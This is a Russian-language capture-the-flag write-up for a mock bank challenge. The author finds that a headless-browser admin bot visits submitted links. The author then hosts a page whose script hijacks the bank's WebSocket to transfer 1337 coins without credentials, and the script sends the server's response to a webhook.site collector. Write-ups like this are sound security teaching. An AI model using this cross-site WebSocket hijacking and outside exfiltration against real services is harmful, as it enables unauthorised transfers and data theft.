Создаем аккаунт на сайте. Видим цель: Buy 1000 matchboxes, запрашивает 1337 монет. Из способов получить монеты только перевод.

В main.js видно что используется WebSocket

```js
ws = new WebSocket(`wss://${host}/ws`);
```

Функции перевода и проверки баланса

```js
function transfer() {
 auth();
 ws.send(JSON.stringify({
  "action":"transfer",
  "login": loginInput.value,
  "password": passwordInput.value,
  "amount": parseInt(amountInput.value),
  "to": recipientInput.value
 }))
}
```

```js
function balance() {
 auth();
 ws.send(JSON.stringify({
  "action": "balance",
  "login": loginInput.value,
  "password": passwordInput.value
 }))
}
```

Снизу на сайте есть форма для отправки ссылок "на проверку администрации". Отправив ссылку на webhook.site, пришел запрос с User-Agent

Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/123.0.0.0 Safari/537.36

Видим, что это Headless Chrome, значит можно эксплуатировать скрипты. Включаем CORS в настройках webhook.site. Пишем простую html страничку:

```html
<script>
  const ws = new WebSocket("wss://t-bank-kum1nkhz.spbctf.net/ws");
  ws.onopen = () => {
    ws.send(
      JSON.stringify({
        action: "transfer",
        login: "",
        password: "",
        amount: 1337,
        to: "privettinkoff212",
      })
    );
  };

  ws.onmessage = (event) => {
    fetch("https://webhook.site/eff4db58-63d2-40ed-8d52-fd046f465b0f", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        data: event.data,
      }),
    });
  };
</script>
```

Захостить её можно, например, на surge.sh. Здесь мы пробуем выполнить перевод не указав логин и пароль, ибо банально не знаем их. И чудо, оно успешно переводит монеты, о чём приходит запрос на вебхук сайт. Остаётся обновить страницу банка, снова нажать Buy 1000 matchboxes и забрать флаг


